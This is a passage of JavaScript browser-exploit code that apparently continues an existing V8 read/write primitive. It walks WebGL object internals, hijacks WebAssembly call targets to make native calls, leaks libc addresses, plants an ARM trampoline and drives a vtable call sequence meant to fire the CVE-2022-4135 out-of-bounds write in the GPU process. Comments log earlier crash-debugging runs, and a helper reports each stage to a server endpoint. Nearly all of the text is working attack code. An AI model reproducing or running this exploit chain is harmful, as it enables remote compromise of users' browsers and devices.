        const layoutWasmBytes = new Uint8Array([
          0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
          0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
          0x03, 0x02, 0x01, 0x00,
          0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00,
          0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b
        ]);
        const layoutWasmModule = new WebAssembly.Module(layoutWasmBytes);
        const layoutWasmInstance = new WebAssembly.Instance(layoutWasmModule);
        const layoutWasmResult = layoutProbeCodeField(layoutWasmInstance.exports.f);
        window.__portal_wasm_code_pointer_valid = layoutWasmResult.pointerValid;
        window.__portal_wasm_code_map_pointer_valid = layoutWasmResult.mapPointerValid;
        window.__portal_wasm_code_region_far = layoutWasmResult.regionFar;
      } catch (_layoutWasmProbeError) {}
    }
    if (window.__portal_webgl_graph_probe_requested &&
        window.__portal_rw_roundtrip_attempted &&
        window.__portal_rw_roundtrip_match &&
        window.__portal_pointer_model_hint === "32-bit-layout") {
      // Read-only Blink object-graph walk for CVE-2022-4135 (Phase B1):
      // JS WebGL2RenderingContext -> ScriptWrappable* (internal field #1) ->
      // WebGLRenderingContextBase::drawing_buffer_ -> DrawingBuffer::gl_ /
      // context_provider_ -> WebGraphicsContext3DProvider. No writes, no native
      // calls; reports only booleans + the drawing_buffer_ offset that resolved.
      window.__portal_webgl_graph_attempted = true;
      const read32 = function (address) {
        return v8_read64(address) & 0xffffffffn;
      };
      const isRawPtr = function (w) {
        return (w & 1n) === 0n && w > 0x1000n;
      };
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl2");
        window.__portal_webgl_ctx_created = !!gl;
        if (gl) {
          const glAddr = addr_of(gl);
          if (glAddr > 0n) {
            // JSApiObject: internal fields are the raw (untagged) pointers stored
            // at the tail of the object. Field #0 = WrapperTypeInfo*, field #1 =
            // the raw blink::ScriptWrappable* (== WebGLRenderingContextBase*).
            // In-object properties before them are tagged (odd) or Smi (small),
            // so the LAST raw pointer in a bounded window is field #1.
            const rawOffsets = [];
            for (let off = 0x0cn; off <= 0x80n; off += 4n) {
              if (isRawPtr(read32(glAddr + off))) {
                rawOffsets.push(off);
              }
            }
            window.__portal_webgl_native_candidates = rawOffsets.length;
            let native = 0n;
            if (rawOffsets.length >= 1) {
              native = read32(glAddr + rawOffsets[rawOffsets.length - 1]);
            }
            window.__portal_webgl_native_resolved =
              native !== 0n && isRawPtr(native);
            if (window.__portal_webgl_native_resolved) {
              // drawing_buffer_ offsets: primary 0x5C, alternates 0x58 / 0x54
              // (the two secondary-vptr deltas). A valid db is a raw pointer
              // whose first word (vptr) is itself a raw pointer.
              const dbOffsets = [0x5cn, 0x58n, 0x54n];
              let db = 0n;
              let dbOff = -1n;
              for (let i = 0; i < dbOffsets.length; i += 1) {
                const cand = read32(native + dbOffsets[i]);
                if (isRawPtr(cand) && isRawPtr(read32(cand))) {
                  db = cand;
                  dbOff = dbOffsets[i];
                  break;
                }
              }
              window.__portal_webgl_db_valid = db !== 0n;
              window.__portal_webgl_db_offset = db !== 0n ? Number(dbOff) : -1;
              if (db !== 0n) {
                const glPtr = read32(db + 0x24n);
                const wrapper = read32(db + 0x20n);
                const prov = isRawPtr(wrapper) ? read32(wrapper + 0x04n) : 0n;
                window.__portal_webgl_gl_valid = isRawPtr(glPtr);
                window.__portal_webgl_prov_valid = isRawPtr(prov);
                window.__portal_webgl_gl_prov_distinct =
                  window.__portal_webgl_gl_valid &&
                  window.__portal_webgl_prov_valid &&
                  glPtr !== prov && glPtr !== wrapper;
                // Phase B2 (vtable-call sanity): call provider->ContextGL()
                // through the vtable (slot 3) and confirm it returns exactly
                // gl_ — the drawing_buffer.cc:236 invariant. One native call,
                // target read from the vtable (no printf/libc needed).
                if (window.__portal_webgl_vtable_probe_requested) {
                  window.__portal_webgl_vtable_attempted = true;
                  try {
                    const vptr = read32(prov);
                    const ctxGL = read32(vptr + 0x0cn);
                    window.__portal_webgl_vtable_entry_valid =
                      (ctxGL & 1n) === 1n && (ctxGL & ~1n) > 0x1000n;
                    if (window.__portal_webgl_vtable_entry_valid) {
                      let vfn = null;
                      try {
                        const vmod = new WebAssembly.Module(new Uint8Array([
                          0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
                          0x01, 0x06, 0x01, 0x60, 0x01, 0x7f, 0x01, 0x7f,
                          0x03, 0x02, 0x01, 0x00,
                          0x07, 0x05, 0x01, 0x01, 0x76, 0x00, 0x00,
                          0x0a, 0x06, 0x01, 0x04, 0x00, 0x20, 0x00, 0x0b
                        ]));
                        const vinst = new WebAssembly.Instance(vmod);
                        vfn = vinst.exports.v;
                      } catch (_vmodErr) {}
                      if (vfn) {
                        const vfnAddr = addr_of(vfn);
                        const vsfi = read32(vfnAddr + 0x0cn);
                        const vfdata = read32((vsfi - 1n) + 0x04n);
                        const vinternal = read32((vfdata - 1n) + 0x04n);
                        const vct = (vinternal - 1n) + 0x04n;
                        const vorg = v8_read64(vct);
                        const vnew = (vorg & 0xFFFFFFFF00000000n) | ctxGL;
                        const provSigned = prov >= 0x80000000n
                          ? Number(prov) - 0x100000000 : Number(prov);
                        let result = null;
                        try {
                          v8_write64(vct, vnew);
                          try {
                            result = vfn(provSigned);
                          } finally {
                            v8_write64(vct, vorg);
                          }
                        } catch (_vcallErr) {
                          try { v8_write64(vct, vorg); } catch (_vrestoreErr) {}
                        }
                        if (typeof result === "number" && Number.isFinite(result)) {
                          window.__portal_webgl_vtable_result_is_number = true;
                          window.__portal_webgl_vtable_match =
                            (BigInt(result >>> 0)) === (glPtr & 0xFFFFFFFFn);
                        }
                      }
                    }
                  } catch (_vtableErr) {}
                }
                // Phase B2 (trigger): drive the CVE-2022-4135 sequence to fire
                // the TextureManager::SetLevelCleared OOB write in the browser
                // process (in-process GPU). 11 fresh vtable calls (each function
                // used once) + one shared struct buffer allocated BEFORE any call.
                if (window.__portal_webgl_trigger_probe_requested) {
                  window.__portal_webgl_trigger_attempted = true;
                  const tStage = function (s) {
                    try {
                      const sx = new XMLHttpRequest();
                      sx.open("POST", "/api/stage", false);
                      sx.setRequestHeader("Content-Type", "application/json");
                      sx.send(JSON.stringify({stage: s}));
                    } catch (_stageSyncErr) {}
                  };
                  tStage("trig_start");
                  const u32b = function (n) {
                    return typeof n === "number" && Number.isFinite(n)
                      ? BigInt(n >>> 0) : 0n;
                  };
                  try {
                    // Leak printf (Thumb) from the V8 isolate ExternalReferenceTable
                    // via the WasmInstanceObject graph (read-only; the getpid run
                    // proved this walk). mprotect = printf - 0xBE01 (ARM leaf).
                    const trampWords = __TRAMP_WORDS__;
                    let trampAddr = 0n;
                    let printfAddr = 0n;
                    try {
                      const tf = window.portal_tramp_fn;
                      const fnAddr = addr_of(tf);
                      const sfi = read32(fnAddr + 0x0cn);
                      const fdata = read32((sfi - 1n) + 0x04n);
                      const internal = read32((fdata - 1n) + 0x04n);
                      const instance = read32((internal - 1n) + 0x08n);
                      const base = instance - 1n;
                      const ir = read32(base + 0x3cn);
                      const iso = ir - 0xFFFn;
                      let initOff = 0;
                      for (let off = 0n; off < 0x7ff0n; off += 4n) {
                        if (read32(iso + off) === 1n &&
                            read32(iso + off + 4n) === 0n &&
                            (read32(iso + off + 8n) & 1n) === 0n &&
                            read32(iso + off + 8n) > 0x1000n) {
                          initOff = Number(off);
                          break;
                        }
                      }
                      let tableOff = 0;
                      if (initOff > 0) {
                        const limit = BigInt(initOff - 296);
                        for (let off = 120n; off < limit; off += 4n) {
                          const w296 = read32(iso + off + 296n);
                          if (read32(iso + off) === 0n &&
                              read32(iso + off + 4n) > 0x1000n &&
                              (w296 & 1n) === 1n &&
                              (w296 & ~1n) > 0x1000n) {
                            tableOff = Number(off);
                            break;
                          }
                        }
                      }
                      if (tableOff > 0) {
                        printfAddr = read32(iso + BigInt(tableOff + 296));
                      }
                    } catch (_printfLeakErr) {}
                    window.__portal_webgl_trigger_printf_valid = printfAddr > 0x1000n;
                    const tmod1 = new WebAssembly.Module(new Uint8Array(__WASM_MULTI1_MODULE_BYTES__));
                    const tinst1 = new WebAssembly.Instance(tmod1);
                    const fns = [
                      tinst1.exports.f0, tinst1.exports.f1, tinst1.exports.f2,
                      tinst1.exports.f3, tinst1.exports.f4, tinst1.exports.f5,
                      tinst1.exports.f6, tinst1.exports.f7, tinst1.exports.f8,
                      tinst1.exports.f9, tinst1.exports.f10, tinst1.exports.f11
                    ];
                    tStage("trig_mod");
                    // Allocate + resolve the struct buffer FIRST (against the clean
                    // pre-native-call heap — run 5 proved buffer-after-call crashes).
                    const tbuf = new ArrayBuffer(0x10000);
                    const tview = new Uint8Array(tbuf);
                    const tdv = new DataView(tbuf);
                    const taddr = addr_of(tbuf);
                    const tlen = BigInt(tbuf.byteLength);
                    let backing = 0n;
                    for (let off = 0n; off <= 0x48n; off += 4n) {
                      const w = v8_read64(taddr + off);
                      if ((w & 0xffffffffn) === tlen &&
                          ((w >> 32n) & 0xffffffffn) === tlen) {
                        const be = v8_read64(taddr + off + 8n);
                        if ((be & 0xffffffffn) !== 0n) {
                          backing = be & 0xffffffffn;
                          break;
                        }
                      }
                    }
                    window.__portal_webgl_trigger_buffer_resolved = backing !== 0n;
                    tStage("trig_buf=" + (backing !== 0n ? "1" : "0"));
                    // js->wasm marshals only r0 reliably: mprotect via a 3-param fn
                    // crashed (r1/r2 garbage -> PROT_NONE on the code page). So probe
                    // whether a wasm->wasm call (direct/cross-module) routes through
                    // the callee's call_target, which would let us marshal via V8's
                    // own ABI instead of the broken js->wasm path.
                    window.__portal_webgl_trigger_mprotect_ok = false;
                    window.__portal_webgl_trigger_mprotect_result = -1;
                    window.__portal_webgl_trigger_mprotect_errno = -1;
                    window.__portal_webgl_trigger_mmap_ok = false;
                    window.__portal_webgl_trigger_mmap_errno = -1;
                    window.__portal_webgl_trigger_tramp_written = false;
                    window.__portal_webgl_trigger_tramp_word_hits = 0;
                    // Redirect a wasm fn's call_target to a native target, call it
                    // with Number args, restore. Fresh fn per call.
                    const nativeCall = function (fn, targetAddr, args) {
                      const fnAddr = addr_of(fn);
                      const sfi = read32(fnAddr + 0x0cn);
                      const fdata = read32((sfi - 1n) + 0x04n);
                      const internal = read32((fdata - 1n) + 0x04n);
                      const ct = (internal - 1n) + 0x04n;
                      const orig = v8_read64(ct);
                      v8_write64(ct, (orig & 0xFFFFFFFF00000000n) | (targetAddr & 0xFFFFFFFFn));
                      try {
                        if (args.length === 1) return fn(args[0]);
                        if (args.length === 2) return fn(args[0], args[1]);
                        if (args.length === 3) return fn(args[0], args[1], args[2]);
                        if (args.length === 4) return fn(args[0], args[1], args[2], args[3]);
                        return -1;
                      } finally {
                        v8_write64(ct, orig);
                      }
                    };
                    // __errno() -> &errno (TLS); read the 32-bit errno value.
                    const errnoSym = (printfAddr - 0x505BAn) & 0xFFFFFFFFn;
                    const readErrno = function (fn) {
                      try {
                        const r = nativeCall(fn, errnoSym, [0]);
                        const p = BigInt(r >>> 0);
                        if (p > 0x1000n) {
                          const e = read32(p);
                          return e <= 4095n ? Number(e) : -1;
                        }
                      } catch (_errNoErr) {}
                      return -1;
                    };
                    let dwTarget = 0n;
                    if (printfAddr > 0x1000n) {
                      const tf = window.portal_tramp_fn;
                      const tfAddr = addr_of(tf);
                      const codeTagged = read32(tfAddr + 0x18n);
                      window.__portal_webgl_trigger_tramp_code_valid =
                        (codeTagged & 1n) === 1n && (codeTagged & ~1n) > 0x1000n;
                      if (window.__portal_webgl_trigger_tramp_code_valid) {
                        dwTarget = (codeTagged - 1n) + 0x40n;
                        try {
                          const sfi = read32(tfAddr + 0x0cn);
                          const fdata = read32((sfi - 1n) + 0x04n);
                          const internal = read32((fdata - 1n) + 0x04n);
                          const ctVal = v8_read64((internal - 1n) + 0x04n);
                          const callTarget = ctVal & 0xffffffffn;
                          if ((callTarget & 1n) === 1n && (callTarget & ~1n) > 0x1000n) {
                            dwTarget = callTarget & ~1n;
                          }
                        } catch (_ctErr) {}
                      }
                      // js->wasm marshals only r0; direct wasm->wasm ignores
                      // call_target; cross-module import crashes on hijack. Use
                      // call_indirect instead: the instance caches RAW shortcuts to
                      // the function table (kIndirectFunctionTableTargetsOffset=0x2c,
                      // SigIds=0x30). Overwrite targets[0] -> mmap (keep sig_ids[0]
                      // so the signature check passes) and drive dispatcher A(0),
                      // which loads 4 args and call_indirects into it. The wasm ABI
                      // marshals r0-r3 correctly.
                      window.__portal_webgl_trigger_targets_ptr_valid = false;
                      window.__portal_webgl_trigger_target0_match = false;
                      window.__portal_webgl_trigger_mmap_ok = false;
                      window.__portal_webgl_trigger_mmap_errno = -1;
                      window.__portal_webgl_trigger_tramp_written = false;
                      window.__portal_webgl_trigger_tramp_word_hits = 0;
                      window.__portal_ci_mmap_rw_ok = false;
                      let mmapAddr = 0n;
                      try {
                        const dmod = new WebAssembly.Module(new Uint8Array(__WASM_DISPATCH_I64_MODULE_BYTES__));
                        const dinst = new WebAssembly.Instance(dmod);
                        const dA = dinst.exports.A;
                        const dB = dinst.exports.B;
                        window.__portal_ci_i64_valid = true;
                        const bAddr = addr_of(dB);
                        const bsfi = read32(bAddr + 0x0cn);
                        const bfdata = read32((bsfi - 1n) + 0x04n);
                        const binternal = read32((bfdata - 1n) + 0x04n);
                        const bct = v8_read64((binternal - 1n) + 0x04n);
                        const bTarget = bct & 0xffffffffn;
                        // RWX-race gate #2: is the wasm CODE low (< 0x80000000, reachable
                        // by v8_write64) or high (mmap'd, unreachable — v8_write64 faults
                        // there as shown by trig_ew)? Decides whether the code-space RW
                        // window is writable at all.
                        tStage("trig_code_hi=" + ((bTarget >= 0x80000000n) ? "1" : "0"));
                        const bInstance = read32((binternal - 1n) + 0x08n);
                        const ibase = bInstance - 1n;
                        const targetsPtr = read32(ibase + 0x2cn);
                        window.__portal_webgl_trigger_targets_ptr_valid =
                          (targetsPtr & 1n) === 0n && targetsPtr > 0x1000n;
                        let t0 = 0n;
                        if (window.__portal_webgl_trigger_targets_ptr_valid) {
                          t0 = read32(targetsPtr);
                        }
                        window.__portal_webgl_trigger_target0_match =
                          t0 === bTarget && bTarget > 0x1000n;
                        const dmem = new Uint32Array(dinst.exports.mem.buffer);
                        // Resolve the WasmIndirectFunctionTable struct's ref slot for
                        // entry 0. The call_indirect passes this ref (untagged) as the
                        // instance in r3, so overwriting it to 0x23 makes r3 == 0x22
                        // (MAP_PRIVATE|MAP_ANON) -- the wasm ABI's r3 is otherwise the
                        // instance pointer, which is why mmap's flags were garbage.
                        // FixedArray header is map@0x00, length@0x04, elements@0x08.
                        // The struct body holds the tagged refs; scan for the instance.
                        let refSlot = 0n;
                        let refOrig = 0n;
                        let refOrig64 = 0n;
                        window.__portal_ci_ref_slot_offset = 0;
                        try {
                          const tablesArr = read32(ibase + 0x8cn);
                          if ((tablesArr & 1n) === 1n) {
                            const iftStruct = read32((tablesArr - 1n) + 0x08n);
                            if ((iftStruct & 1n) === 1n) {
                              const sbase = iftStruct - 1n;
                              for (let off = 0x0cn; off <= 0x2cn; off += 4n) {
                                const v = read32(sbase + off);
                                if (v === bInstance) {
                                  refSlot = sbase + off;
                                  refOrig = v;
                                  refOrig64 = v8_read64(refSlot);
                                  window.__portal_ci_ref_slot_valid = true;
                                  window.__portal_ci_ref_slot_offset = Number(off);
                                  break;
                                }
                              }
                            }
                          }
                        } catch (_refErr) {}
                        // Safe marshaling probe via call_indirect. getpid tests the
                        // table hijack + call_indirect + return path; abs(-0x1234)
                        // tests r0. 6 descriptor slots are loaded by A; extra slots
                        // are harmless for 0/1-arg calls.
                        // 6-slot arg descriptor lives at byte 0x400 in linear memory
                        // (NOT byte 0), so a trampoline parked at dmem[0..19] is never
                        // clobbered by the arg marshal.
                        const CI_DESC = 0x400;
                        const ciCall = function (targetSym, vals) {
                          const wb = CI_DESC >> 2;
                          dmem[wb + 0] = vals[0] >>> 0; dmem[wb + 1] = vals[1] >>> 0;
                          dmem[wb + 2] = vals[2] >>> 0; dmem[wb + 3] = vals[3] >>> 0;
                          dmem[wb + 4] = vals[4] >>> 0; dmem[wb + 5] = vals[5] >>> 0;
                          const t0orig = v8_read64(targetsPtr);
                          v8_write64(targetsPtr, (t0orig & 0xFFFFFFFF00000000n) | (targetSym & 0xFFFFFFFFn));
                          let r = -1;
                          try {
                            r = dA(CI_DESC);
                          } finally {
                            v8_write64(targetsPtr, t0orig);
                          }
                          return (typeof r === "number") ? Math.floor(r) : -1;
                        };
                        if (window.__portal_webgl_trigger_target0_match) {
                          const getpidSym = (printfAddr - 0x4DE94n) & 0xFFFFFFFFn;
                          const absSym = (printfAddr - 0xD9C4n) & 0xFFFFFFFFn;
                          const mprotectSym = (printfAddr - 0xBE01n) & 0xFFFFFFFFn;
                          if ((getpidSym & 1n) === 1n && (getpidSym & ~1n) > 0x1000n) {
                            tStage("trig_cig");
                            window.__portal_ci_getpid_result = ciCall(getpidSym, [0, 0, 0, 0, 0, 0]);
                            tStage("trig_cig1");
                          }
                          if (window.__portal_ci_getpid_result > 0 &&
                              window.__portal_ci_getpid_result < 0x100000 &&
                              (absSym & 1n) === 1n && (absSym & ~1n) > 0x1000n) {
                            tStage("trig_cia");
                            window.__portal_ci_abs_result = ciCall(absSym, [0xFFFFEDCC, 0, 0, 0, 0, 0]);
                            tStage("trig_cia1");
                          }
                          const mmapSym = (printfAddr - 0x43978n) & 0xFFFFFFFFn;
                          // syscall() is ARM-mode (st_value even). printfAddr carries
                          // the Thumb bit, so the offset must reproduce 0x19E90 exactly.
                          const syscallSym = (printfAddr - 0x536A9n) & 0xFFFFFFFFn;
                          const errnoSym = (printfAddr - 0x505BAn) & 0xFFFFFFFFn;
                          let errnoPtr = 0n;
                          const readErrnoNow = function () {
                            if (errnoPtr === 0n) return -1;
                            try {
                              const v = read32(errnoPtr) & 0xFFFFFFFFn;
                              return Number(v);
                            } catch (_errErr) { return -1; }
                          };
                          if ((errnoSym & 1n) === 1n && (errnoSym & ~1n) > 0x1000n) {
                            const epRaw = ciCall(errnoSym, [0, 0, 0, 0, 0, 0]);
                            const epU = BigInt(epRaw >>> 0);
                            // __errno() = TP + 8 (TLS slot). This device runs a
                            // 32-bit userspace on an arm64 kernel ("armv8l"), so
                            // there is NO 3G/1G split: the 32-bit process gets the
                            // full 4 GiB, with only the kuser vectors page at
                            // 0xFFFF0000 reserved. A TLS pointer >= 0xC0000000 is
                            // normal here; accept < 0xFFFF0000.
                            if (epU === 0n) {
                              window.__portal_ci_errno_ret_class = 1;
                            } else if (epU === 0xFFFFFFFFn) {
                              window.__portal_ci_errno_ret_class = 2;
                            } else if (epU < 0x80000000n) {
                              window.__portal_ci_errno_ret_class = 3;
                            } else if (epU < 0xFFFF0000n) {
                              window.__portal_ci_errno_ret_class = 4;
                            } else {
                              window.__portal_ci_errno_ret_class = 5;
                            }
                            if (epU > 0x1000n && epU < 0xFFFF0000n) {
                              errnoPtr = epU;
                              window.__portal_ci_errno_resolved = true;
                            }
                          }
                          // ARM-mode roundtrip sanity BEFORE any mmap attempt:
                          // syscall(20)=SYS_getpid is harmless and must return a
                          // valid pid. This isolates a broken blx->ARM->svc->ret
                          // (the mprotect crash signature) from an mmap2-specific
                          // arg/address problem.
                          if ((syscallSym & 1n) === 0n && (syscallSym & ~1n) > 0x1000n) {
                            const scPid = ciCall(syscallSym, [20, 0, 0, 0, 0, 0]);
                            window.__portal_ci_syscall_getpid_result = scPid;
                            window.__portal_ci_syscall_getpid_valid =
                              (scPid > 0 && scPid < 0x100000);
                            tStage("trig_sc=" + (window.__portal_ci_syscall_getpid_valid ? "1" : "0"));
                          }
                          if (window.__portal_ci_abs_result === 0x1234 &&
                              (syscallSym & 1n) === 0n && (syscallSym & ~1n) > 0x1000n) {
                            // Read the wasm linear-memory base DIRECTLY from the
                            // WasmInstanceObject (kMemoryStartOffset = 0x18, verified
                            // against the V8 10.6 field-layout macro).
                            let memStart = 0n;
                            try {
                              memStart = read32(ibase + 0x18n) & 0xFFFFFFFFn;
                            } catch (_msErr) {}
                            window.__portal_webgl_trigger_memstart_valid = memStart >= 0x1000n;
                            // Write the 20-word ARM trampoline into wasm linear memory
                            // at byte 0 (dmem[0..19]). ciCall args live at byte 0x400.
                            let twOk = true;
                            for (let wi = 0; wi < trampWords.length; wi += 1) {
                              dmem[wi] = Number(trampWords[wi] & 0xFFFFFFFFn);
                            }
                            for (let wi = 0; wi < trampWords.length; wi += 1) {
                              if ((BigInt(dmem[wi]) & 0xFFFFFFFFn) !== (trampWords[wi] & 0xFFFFFFFFn)) {
                                twOk = false;
                                break;
                              }
                            }
                            tStage("trig_tw=" + (twOk ? "1" : "0"));
                            // Confirm memStart really points at the trampoline (dmem[0]).
                            let msHit = false;
                            if (memStart >= 0x1000n) {
                              try {
                                msHit = (read32(memStart) & 0xFFFFFFFFn) === (trampWords[0] & 0xFFFFFFFFn);
                              } catch (_ms2Err) {}
                            }
                            tStage("trig_ms=" + (msHit ? "1" : "0"));
                            // mmap2 RWX diagnostic (ref=7 -> prot=7). The region it
                            // returns is NOT writable (seccomp strips PROT_WRITE), so it
                            // is diagnostic-only.
                            const SYS_MMAP2 = 0xC0;  // __NR_mmap2 = 192 (ARM EABI)
                            if (window.__portal_ci_ref_slot_valid) {
                              try {
                                const rc = v8_read64(refSlot);
                                v8_write64(refSlot, (rc & 0xFFFFFFFF00000000n) | 0x7n);
                                window.__portal_ci_ref_overwrite_ok = true;
                              } catch (_refOverErr) {}
                            }
                            tStage("trig_mm");
                            const rwx = ciCall(syscallSym,
                              [SYS_MMAP2, 0x10000, 0, 0x22, 0xFFFFFFFF, 0]);
                            tStage("trig_mm1");
                            window.__portal_ci_mmap_rwx_ret_fail = (rwx === -1);
                            window.__portal_webgl_trigger_mmap_ok =
                              (rwx !== -1 && rwx !== 0) && (BigInt(rwx >>> 0) >= 0x1000n) &&
                              ((BigInt(rwx >>> 0) & 0xFFFn) === 0n);
                            window.__portal_webgl_trigger_mmap_errno =
                              window.__portal_webgl_trigger_mmap_ok ? -1 : readErrnoNow();
                            if (window.__portal_webgl_trigger_mmap_ok) {
                              mmapAddr = BigInt(rwx >>> 0);
                            }
                            {
                              let mc = 0;
                              const u = BigInt(rwx >>> 0);
                              if (rwx !== -1 && rwx !== 0) {
                                if (u < 0x1000n) mc = 2;
                                else if ((u & 0xFFFn) !== 0n) mc = 2;
                                else if (u < 0x80000000n) mc = 3;
                                else mc = 4;
                              } else if (rwx === 0) mc = 1;
                              window.__portal_ci_mmap_rwx_class = mc;
                              tStage("trig_mmc=" + mc + ":e" + window.__portal_webgl_trigger_mmap_errno);
                            }
                            window.__portal_webgl_trigger_tramp_written =
                              twOk && window.__portal_webgl_trigger_mmap_ok;
                            window.__portal_webgl_trigger_tramp_word_hits =
                              (twOk && window.__portal_webgl_trigger_mmap_ok) ? trampWords.length : 0;
                            // Restore the ref (ref=7 was set only for the mmap2 diagnostic).
                            if (window.__portal_ci_ref_slot_valid) {
                              try { v8_write64(refSlot, refOrig64); } catch (_refRestoreErr) {}
                            }
                            // mprotect is a dead end (r1 poisoned: direct mprotect() puts
                            // len in r1 -> ENOMEM; syscall(125,..) puts addr in r1 -> a
                            // V8-heap pointer -> SIGSEGV). Skip it so the run reaches the
                            // report and the gc_survival timer. trampAddr stays 0.
                            window.__portal_webgl_trigger_mprotect_errno = -1;
                            window.__portal_webgl_trigger_mprotect_ok = false;
                            window.__portal_webgl_trigger_mprotect_result = -1;
                            tStage("trig_nomprotect");
                          }
                        }
                      } catch (_ciErr) {}
                      tStage("trig_ci=done");
                      // The trampoline lives at wasm linear-memory byte 0, made
                      // executable in place by mprotect(mem_start, 0x1000, RX).
                      // trampAddr is set to the WasmInstanceObject's memory_start
                      // (verified == the trampoline base) only when mprotect==0.
                    }
                    window.__portal_webgl_trigger_tramp_found = trampAddr >= 0x1000n;
                    tStage("trig_tramp=" + (trampAddr >= 0x1000n ? "1" : "0"));
                    if (backing !== 0n && trampAddr >= 0x1000n) {
                      // Trampoline call descriptor: [entry][arg0..arg8] (10 words).
                      const DESC = backing + 0xC0n;
                      const vcall = function (obj, idx, args, fn) {
                        const vp = read32(obj);
                        const entry = read32(vp + BigInt(idx * 4));
                        const a = [];
                        for (let i = 0; i < 9; i += 1) {
                          a.push(i < args.length ? (args[i] & 0xFFFFFFFFn) : 0n);
                        }
                        v8_write64(DESC + 0x00n, ((a[0] << 32n) | (entry & 0xFFFFFFFFn)));
                        v8_write64(DESC + 0x08n, ((a[2] << 32n) | a[1]));
                        v8_write64(DESC + 0x10n, ((a[4] << 32n) | a[3]));
                        v8_write64(DESC + 0x18n, ((a[6] << 32n) | a[5]));
                        v8_write64(DESC + 0x20n, ((a[8] << 32n) | a[7]));
                        const fnAddr = addr_of(fn);
                        const sfi = read32(fnAddr + 0x0cn);
                        const fdata = read32((sfi - 1n) + 0x04n);
                        const internal = read32((fdata - 1n) + 0x04n);
                        const ct = (internal - 1n) + 0x04n;
                        const orig = v8_read64(ct);
                        const neu = (orig & 0xFFFFFFFF00000000n) | trampAddr;
                        const descSigned = DESC >= 0x80000000n
                          ? Number(DESC) - 0x100000000 : Number(DESC);
                        let result = null;
                        try {
                          v8_write64(ct, neu);
                          try {
                            result = fn(descSigned);
                          } finally {
                            v8_write64(ct, orig);
                          }
                        } catch (_tcallErr) {
                          try { v8_write64(ct, orig); } catch (_trestoreErr) {}
                        }
                        return result;
                      };
                      // structs: mailbox@0x00(16), sync_token@0x20(24),
                      // size@0x40(8)={32,32}, colorspace@0x60(68) sRGB,
                      // attachment@0xB0(4)=0x8CE0, framebuffer@0xB4(4).
                      tdv.setInt32(0x40, 32, true);
                      tdv.setInt32(0x44, 32, true);
                      tview[0x60] = 1; tview[0x61] = 14; tview[0x62] = 1; tview[0x63] = 2;
                      tdv.setUint32(0xB0, 0x8CE0, true);
                      const MB = backing + 0x00n;
                      const ST = backing + 0x20n;
                      const SZ = backing + 0x40n;
                      const CS = backing + 0x60n;
                      const AT = backing + 0xB0n;
                      const FB = backing + 0xB4n;
                      let calls = 0;
                      // 1) sii = provider->SharedImageInterface() [slot 16]
                      tStage("trig_c1");
                      const sii = u32b(vcall(prov, 16, [prov], fns[0]));
                      calls += 1;
                      window.__portal_webgl_trigger_sii_resolved = sii > 0x1000n;
                      tStage("trig_sii=" + (sii > 0x1000n ? "1" : "0"));
                      if (sii > 0x1000n) {
                        // SAFE probe: GenFramebuffers [slot 53] (3 args:
                        // this=gl, n=1, &fb) -- verifies r0-r2 multi-arg
                        // marshaling BEFORE the 9-arg sret call below.
                        tStage("trig_probe3");
                        vcall(glPtr, 53, [glPtr, 1n, FB], fns[1]);
                        calls += 1;
                        const fb = read32(FB);
                        tStage("trig_probe3_fb=" + (fb > 0n ? "1" : "0"));
                        // 2) CreateSharedImage [slot 2]: this=sii, sret=MB,
                        //    format=1, &SZ, &CS, then stack: origin=1, alpha=2,
                        //    usage=0xB, surface=0  (9 words total)
                        tStage("trig_c2");
                        vcall(sii, 2, [sii, MB, 1n, SZ, CS, 1n, 2n, 0xBn, 0n], fns[2]);
                        calls += 1;
                        // 3) sii->Flush [slot 15]
                        tStage("trig_c3");
                        vcall(sii, 15, [sii], fns[3]);
                        calls += 1;
                        // 4) GenUnverifiedSyncToken [slot 12]: this=sii, sret=ST
                        tStage("trig_c4");
                        vcall(sii, 12, [sii, ST], fns[4]);
                        calls += 1;
                        // 5) WaitSyncTokenCHROMIUM [slot 3]: ST
                        tStage("trig_c5");
                        vcall(glPtr, 3, [glPtr, ST], fns[5]);
                        calls += 1;
                        // 6) gl->Flush [slot 49]
                        tStage("trig_c6");
                        vcall(glPtr, 49, [glPtr], fns[6]);
                        calls += 1;
                        // 7) CreateAndTexStorage2DSharedImageCHROMIUM [slot 204]: MB -> id
                        tStage("trig_c7");
                        const texId = u32b(vcall(glPtr, 204, [glPtr, MB], fns[7]));
                        calls += 1;
                        window.__portal_webgl_trigger_texture_id =
                          texId > 0n ? Number(texId) : -1;
                        // 8) BindFramebuffer [slot 13]: READ_FB, fb (from probe)
                        tStage("trig_c8");
                        vcall(glPtr, 13, [glPtr, 0x8CA6n, fb], fns[8]);
                        calls += 1;
                        // 9) FramebufferTexture2D [slot 50]: READ_FB, COLOR0,
                        //    TEXTURE_2D, texId, level=1
                        tStage("trig_c9");
                        vcall(glPtr, 50, [glPtr, 0x8CA6n, 0x8CE0n, 0x0DE1n, texId, 1n], fns[9]);
                        calls += 1;
                        // 10) DiscardFramebufferEXT [slot 184]: READ_FB, 1, &attachment
                        //     -> browser-side Texture::SetLevelCleared OOB at level 1
                        tStage("trig_c10");
                        vcall(glPtr, 184, [glPtr, 0x8CA6n, 1n, AT], fns[10]);
                        calls += 1;
                        window.__portal_webgl_trigger_discard_done = true;
                        tStage("trig_done");
                      }
                      window.__portal_webgl_trigger_calls_completed = calls;
                    }
                  } catch (_triggerErr) {}
                }
              }
            }
          }
        }
      } catch (_webglGraphErr) {}
    }
    if (window.__portal_native_getpid_requested &&
        window.__portal_native_spray_ready &&
        window.__portal_rw_roundtrip_attempted &&
        window.__portal_rw_roundtrip_match &&
        window.__portal_pointer_model_hint === "32-bit-layout") {
      window.__portal_native_probe_attempted = true;
      window.native_stage("native_probe_start");
      const NATIVE_KHEADER = 0x40n;
      const NATIVE_WORDS = [0xE92D4FF0n, 0xE3A07014n, 0xEF000000n, 0xE1A00080n, 0xE8BD8FF0n];
      const nativeRead32 = function (address) {
        return v8_read64(address) & 0xffffffffn;
      };
      const nativeIsPointer = function (tagged) {
        return (tagged & 1n) === 1n && tagged > 0x1000n;
      };
      const sprayFuncAddr = addr_of(window.portal_native_spray_fn);
